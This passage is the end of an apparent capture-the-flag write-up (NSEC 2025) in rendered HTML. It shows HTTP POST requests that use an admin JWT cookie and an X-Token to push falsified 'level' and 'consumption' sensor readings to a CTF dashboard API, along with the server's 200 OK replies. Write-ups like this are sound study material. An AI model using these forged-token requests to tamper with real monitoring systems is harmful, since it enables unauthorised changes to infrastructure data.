+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="mi">2025</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">24</span><span class="n">T21</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mf">44.035058</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
+</code></pre></div>
+<p>We can now make the <code>POST</code> request on the <code>/api/metrics/</code> API endpoint for the <code>level</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="err">POST</span><span class="w"> </span><span class="err">/api/me</span><span class="kc">tr</span><span class="err">ics/</span><span class="w"> </span><span class="err">HTTP/</span><span class="mf">1.1</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="err">Hos</span><span class="kc">t</span><span class="p">:</span><span class="w"> </span><span class="err">dashboard.</span><span class="kc">f</span><span class="err">ms.c</span><span class="kc">tf</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="err">Cookie</span><span class="p">:</span><span class="w"> </span><span class="kc">t</span><span class="err">oke</span><span class="kc">n</span><span class="err">=eyJhbGciOiJIUzI</span><span class="mi">1</span><span class="err">NiIsI</span><span class="kc">n</span><span class="err">R</span><span class="mi">5</span><span class="err">cCI</span><span class="mi">6</span><span class="err">IkpXVCJ</span><span class="mf">9.e</span><span class="err">yJzdWIiOiJhZG</span><span class="mi">1</span><span class="err">pbkBmbXMuY</span><span class="mi">3</span><span class="err">RmIiwiYWR</span><span class="kc">ta</span><span class="err">W</span><span class="mi">4</span><span class="err">iO</span><span class="kc">n</span><span class="err">RydWUsImV</span><span class="mi">4</span><span class="err">cCI</span><span class="mi">6</span><span class="err">MTc</span><span class="mi">0</span><span class="err">NzUyMjM</span><span class="mi">2</span><span class="err">M</span><span class="kc">n</span><span class="mf">0.</span><span class="err">pF</span><span class="mi">-</span><span class="err">QSVrCqhbsTTEpPTHgrLZXRETR</span><span class="kc">t</span><span class="mi">095</span><span class="err">pPlGaLuHxWc</span>
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="err">X</span><span class="mi">-</span><span class="err">Toke</span><span class="kc">n</span><span class="p">:</span><span class="w"> </span><span class="mf">6e15</span><span class="err">c</span><span class="mf">755-38e4-11</span><span class="kc">f</span><span class="mi">0-8</span><span class="err">d</span><span class="mi">8</span><span class="err">b</span><span class="mf">-00185594e</span><span class="err">c</span><span class="mi">1</span><span class="err">a</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="err">User</span><span class="mi">-</span><span class="err">Age</span><span class="kc">nt</span><span class="p">:</span><span class="w"> </span><span class="err">Mozilla/</span><span class="mf">5.0</span><span class="w"> </span><span class="err">(X</span><span class="mi">11</span><span class="err">;</span><span class="w"> </span><span class="err">Li</span><span class="kc">nu</span><span class="err">x</span><span class="w"> </span><span class="err">x</span><span class="mi">86</span><span class="err">_</span><span class="mi">64</span><span class="err">;</span><span class="w"> </span><span class="err">rv</span><span class="p">:</span><span class="mf">138.0</span><span class="err">)</span><span class="w"> </span><span class="err">Gecko/</span><span class="mi">20100101</span><span class="w"> </span><span class="err">Fire</span><span class="kc">f</span><span class="err">ox/</span><span class="mf">138.0</span>
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="err">Accep</span><span class="kc">t</span><span class="p">:</span><span class="w"> </span><span class="err">applica</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="err">/jso</span><span class="kc">n</span>
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Type</span><span class="p">:</span><span class="w"> </span><span class="err">applica</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="err">/jso</span><span class="kc">n</span>
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Le</span><span class="kc">n</span><span class="err">g</span><span class="kc">t</span><span class="err">h</span><span class="p">:</span><span class="w"> </span><span class="mi">215</span>
+<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>
+<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="p">{</span>
+<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="w">  </span><span class="nt">&quot;device_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095&quot;</span><span class="p">,</span>
+<a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="w">  </span><span class="nt">&quot;sensor_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a><span class="w">  </span><span class="nt">&quot;sensor_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;level&quot;</span><span class="p">,</span>
+<a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a><span class="w">  </span><span class="nt">&quot;sensor_data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x0000&quot;</span><span class="p">,</span>
+<a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a><span class="w">  </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2025-05-24T21:15:44.035058+00:00&quot;</span>
+<a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a><span class="p">}</span>
+</code></pre></div>
+<p>It worked:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="err">HTTP/</span><span class="mf">1.1</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="err">OK</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="err">Server</span><span class="p">:</span><span class="w"> </span><span class="kc">n</span><span class="err">gi</span><span class="kc">n</span><span class="err">x</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="err">Da</span><span class="kc">te</span><span class="p">:</span><span class="w"> </span><span class="err">Sa</span><span class="kc">t</span><span class="p">,</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="err">May</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="mi">21</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">35</span><span class="w"> </span><span class="err">GMT</span>
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Type</span><span class="p">:</span><span class="w"> </span><span class="err">applica</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="err">/jso</span><span class="kc">n</span>
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Le</span><span class="kc">n</span><span class="err">g</span><span class="kc">t</span><span class="err">h</span><span class="p">:</span><span class="w"> </span><span class="mi">190</span>
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="err">Co</span><span class="kc">nne</span><span class="err">c</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="p">:</span><span class="w"> </span><span class="err">keep</span><span class="mi">-</span><span class="err">alive</span>
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="p">{</span>
+<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="w">    </span><span class="nt">&quot;sensor_data&quot;</span><span class="p">:</span><span class="s2">&quot;0x0000&quot;</span><span class="p">,</span>
+<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="w">    </span><span class="nt">&quot;device_id&quot;</span><span class="p">:</span><span class="s2">&quot;c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095&quot;</span><span class="p">,</span>
+<a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a><span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="mi">1099</span><span class="p">,</span>
+<a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a><span class="w">    </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="s2">&quot;2025-05-24T21:15:44.035058&quot;</span><span class="p">,</span>
+<a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="w">    </span><span class="nt">&quot;sensor_id&quot;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
+<a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a><span class="w">    </span><span class="nt">&quot;sensor_type&quot;</span><span class="p">:</span><span class="s2">&quot;level&quot;</span>
+<a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a><span class="p">}</span>
+</code></pre></div>
+<p>Let's do the same for the <code>consumption</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="err">POST</span><span class="w"> </span><span class="err">/api/me</span><span class="kc">tr</span><span class="err">ics/</span><span class="w"> </span><span class="err">HTTP/</span><span class="mf">1.1</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="err">Hos</span><span class="kc">t</span><span class="p">:</span><span class="w"> </span><span class="err">dashboard.</span><span class="kc">f</span><span class="err">ms.c</span><span class="kc">tf</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="err">Cookie</span><span class="p">:</span><span class="w"> </span><span class="kc">t</span><span class="err">oke</span><span class="kc">n</span><span class="err">=eyJhbGciOiJIUzI</span><span class="mi">1</span><span class="err">NiIsI</span><span class="kc">n</span><span class="err">R</span><span class="mi">5</span><span class="err">cCI</span><span class="mi">6</span><span class="err">IkpXVCJ</span><span class="mf">9.e</span><span class="err">yJzdWIiOiJhZG</span><span class="mi">1</span><span class="err">pbkBmbXMuY</span><span class="mi">3</span><span class="err">RmIiwiYWR</span><span class="kc">ta</span><span class="err">W</span><span class="mi">4</span><span class="err">iO</span><span class="kc">n</span><span class="err">RydWUsImV</span><span class="mi">4</span><span class="err">cCI</span><span class="mi">6</span><span class="err">MTc</span><span class="mi">0</span><span class="err">NzUyMjM</span><span class="mi">2</span><span class="err">M</span><span class="kc">n</span><span class="mf">0.</span><span class="err">pF</span><span class="mi">-</span><span class="err">QSVrCqhbsTTEpPTHgrLZXRETR</span><span class="kc">t</span><span class="mi">095</span><span class="err">pPlGaLuHxWc</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="err">X</span><span class="mi">-</span><span class="err">Toke</span><span class="kc">n</span><span class="p">:</span><span class="w"> </span><span class="mf">6e15</span><span class="err">c</span><span class="mf">755-38e4-11</span><span class="kc">f</span><span class="mi">0-8</span><span class="err">d</span><span class="mi">8</span><span class="err">b</span><span class="mf">-00185594e</span><span class="err">c</span><span class="mi">1</span><span class="err">a</span>
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="err">User</span><span class="mi">-</span><span class="err">Age</span><span class="kc">nt</span><span class="p">:</span><span class="w"> </span><span class="err">Mozilla/</span><span class="mf">5.0</span><span class="w"> </span><span class="err">(X</span><span class="mi">11</span><span class="err">;</span><span class="w"> </span><span class="err">Li</span><span class="kc">nu</span><span class="err">x</span><span class="w"> </span><span class="err">x</span><span class="mi">86</span><span class="err">_</span><span class="mi">64</span><span class="err">;</span><span class="w"> </span><span class="err">rv</span><span class="p">:</span><span class="mf">138.0</span><span class="err">)</span><span class="w"> </span><span class="err">Gecko/</span><span class="mi">20100101</span><span class="w"> </span><span class="err">Fire</span><span class="kc">f</span><span class="err">ox/</span><span class="mf">138.0</span>
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="err">Accep</span><span class="kc">t</span><span class="p">:</span><span class="w"> </span><span class="err">applica</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="err">/jso</span><span class="kc">n</span>
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Type</span><span class="p">:</span><span class="w"> </span><span class="err">applica</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="err">/jso</span><span class="kc">n</span>
+<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Le</span><span class="kc">n</span><span class="err">g</span><span class="kc">t</span><span class="err">h</span><span class="p">:</span><span class="w"> </span><span class="mi">221</span>
+<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>
+<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="p">{</span>
+<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="w">  </span><span class="nt">&quot;device_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095&quot;</span><span class="p">,</span>
+<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a><span class="w">  </span><span class="nt">&quot;sensor_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a><span class="w">  </span><span class="nt">&quot;sensor_type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;consumption&quot;</span><span class="p">,</span>
+<a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a><span class="w">  </span><span class="nt">&quot;sensor_data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x0000&quot;</span><span class="p">,</span>
+<a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a><span class="w">  </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2025-05-24T21:15:44.035058+00:00&quot;</span>
+<a id="__codelineno-27-16" name="__codelineno-27-16" href="#__codelineno-27-16"></a><span class="p">}</span>
+</code></pre></div>
+<p>It worked too:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="err">HTTP/</span><span class="mf">1.1</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="err">OK</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="err">Server</span><span class="p">:</span><span class="w"> </span><span class="kc">n</span><span class="err">gi</span><span class="kc">n</span><span class="err">x</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="err">Da</span><span class="kc">te</span><span class="p">:</span><span class="w"> </span><span class="err">Sa</span><span class="kc">t</span><span class="p">,</span><span class="w"> </span><span class="mi">24</span><span class="w"> </span><span class="err">May</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="mi">21</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">28</span><span class="w"> </span><span class="err">GMT</span>
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Type</span><span class="p">:</span><span class="w"> </span><span class="err">applica</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="err">/jso</span><span class="kc">n</span>
+<a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="err">Co</span><span class="kc">ntent</span><span class="mi">-</span><span class="err">Le</span><span class="kc">n</span><span class="err">g</span><span class="kc">t</span><span class="err">h</span><span class="p">:</span><span class="w"> </span><span class="mi">196</span>
+<a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="err">Co</span><span class="kc">nne</span><span class="err">c</span><span class="kc">t</span><span class="err">io</span><span class="kc">n</span><span class="p">:</span><span class="w"> </span><span class="err">keep</span><span class="mi">-</span><span class="err">alive</span>
+<a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>
+<a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a><span class="p">{</span><span class="nt">&quot;sensor_data&quot;</span><span class="p">:</span><span class="s2">&quot;0x0000&quot;</span><span class="p">,</span><span class="nt">&quot;device_id&quot;</span><span class="p">:</span><span class="s2">&quot;c58538930763e67e57f4bc48adf94261659b0cb0375aa11665db12b19371a095&quot;</span><span class="p">,</span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="mi">1098</span><span class="p">,</span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="s2">&quot;2025-05-24T21:15:44.035058&quot;</span><span class="p">,</span><span class="nt">&quot;sensor_id&quot;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&quot;sensor_type&quot;</span><span class="p">:</span><span class="s2">&quot;consumption&quot;</span><span class="p">}</span>
+</code></pre></div>
+<p>We did pretty much the same things for the second sensor. And we ot this at the end:</p>
+<p><img alt="Level zero" src="../res/nsec25/level-0.png" /></p>
+<p>Final hint:</p>
+<p><img alt="Last hint" src="../res/nsec25/last-hint.png" /></p>
+<p>Mission accomplished.</p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="May 31, 2025 19:44:57 UTC">May 31, 2025</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+    
+  </body>
+</html>
